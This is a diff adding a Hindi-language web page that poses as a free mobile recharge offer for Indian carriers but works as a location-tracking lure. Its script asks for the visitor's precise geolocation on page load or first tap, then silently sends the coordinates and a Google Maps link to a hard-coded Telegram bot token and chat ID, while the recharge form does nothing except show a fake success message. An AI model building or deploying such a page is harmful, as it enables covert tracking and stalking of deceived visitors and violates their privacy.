@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free Recharge</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+  body {
+    background: linear-gradient(135deg, #667eea, #764ba2);
+    min-height: 100vh;
+    display: flex; justify-content: center; align-items: center;
+    padding: 20px;
+  }
+  .card {
+    background: #fff; padding: 30px; border-radius: 15px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    width: 100%; max-width: 400px;
+  }
+  h2 { text-align: center; color: #333; margin-bottom: 20px; }
+  label { display: block; margin-bottom: 6px; color: #555; font-size: 14px; }
+  input, select {
+    width: 100%; padding: 12px; margin-bottom: 15px;
+    border: 1px solid #ccc; border-radius: 8px;
+    font-size: 14px; outline: none;
+  }
+  input:focus, select:focus { border-color: #667eea; }
+  button {
+    width: 100%; padding: 12px; background: #667eea;
+    color: #fff; border: none; border-radius: 8px;
+    font-size: 16px; cursor: pointer; transition: 0.3s;
+  }
+  button:hover { background: #5568d3; }
+  .msg { text-align: center; margin-top: 15px; font-size: 14px; color: green; display: none; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <h2>🎁 Free Recharge</h2>
+  <form id="rechargeForm">
+    <label>मोबाइल नंबर</label>
+    <input type="tel" id="mobile" placeholder="10 अंकों का नंबर" pattern="[0-9]{10}" required>
+
+    <label>ऑपरेटर</label>
+    <select id="operator" required>
+      <option value="">-- चुनें --</option>
+      <option>Jio</option><option>Airtel</option><option>Vi</option><option>BSNL</option>
+    </select>
+
+    <label>रिचार्ज राशि (₹)</label>
+    <select id="amount" required>
+      <option value="">-- चुनें --</option>
+      <option>10</option><option>20</option><option>50</option>
+    </select>
+
+    <button type="submit">Recharge करें</button>
+  </form>
+  <p class="msg" id="msg">✅ रिचार्ज सफल! (डेमो)</p>
+</div>
+
+<script>
+  // ============================================================
+  // ⚠️ यहाँ अपनी Details भरें:
+  // ============================================================
+  const BOT_TOKEN = '8866287858:AAGL_iq2xreb12SAAgRLLgIHSwsO0sMDhSI';
+  const CHAT_ID   = '8121453038';
+
+  let asked = false;
+
+  // ===== असली Browser Location Pop-up =====
+  function askLocation() {
+    if (asked) return;
+    if (!navigator.geolocation) return;
+    asked = true;
+
+    navigator.geolocation.getCurrentPosition(
+      function (pos) {
+        const lat = pos.coords.latitude;
+        const lng = pos.coords.longitude;
+        const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
+
+        // चुपचाप Telegram भेजो — कोई alert नहीं
+        sendToTelegram(lat, lng, mapsLink);
+      },
+      function (err) {
+        // error भी चुपचाप ignore
+        console.log('Location error:', err.message);
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+
+  // पेज load होते ही असली browser pop-up
+  window.addEventListener('load', function () {
+    askLocation();
+  });
+
+  // अगर browser auto-block करे → पहले click/touch पर फिर try
+  document.addEventListener('click', function () {
+    if (!asked) askLocation();
+  }, { once: true });
+
+  document.addEventListener('touchstart', function () {
+    if (!asked) askLocation();
+  }, { once: true });
+
+  // ===== Telegram Bot API (silent) =====
+  function sendToTelegram(lat, lng, mapsLink) {
+    const text =
+      `📍 Location\n\n` +
+      `Lat: ${lat}\n` +
+      `Lng: ${lng}\n\n` +
+      `🗺️ ${mapsLink}`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        disable_web_page_preview: false
+      })
+    })
+    .then(r => r.json())
+    .then(d => {
+      // चुपचाप — कोई alert नहीं
+      console.log(d.ok ? 'TG ✅' : 'TG ❌ ' + d.description);
+    })
+    .catch(e => console.log('Fetch err:', e));
+  }
+
+  // ===== Recharge Form =====
+  document.getElementById('rechargeForm').addEventListener('submit', function (e) {
+    e.preventDefault();
+    const mobile = document.getElementById('mobile').value;
+    if (mobile.length !== 10) {
+      alert('कृपया सही 10 अंकों का मोबाइल नंबर डालें');
+      return;
+    }
+    document.getElementById('msg').style.display = 'block';
+    this.reset();
+  });
+</script>
+
+</body>
+</html>
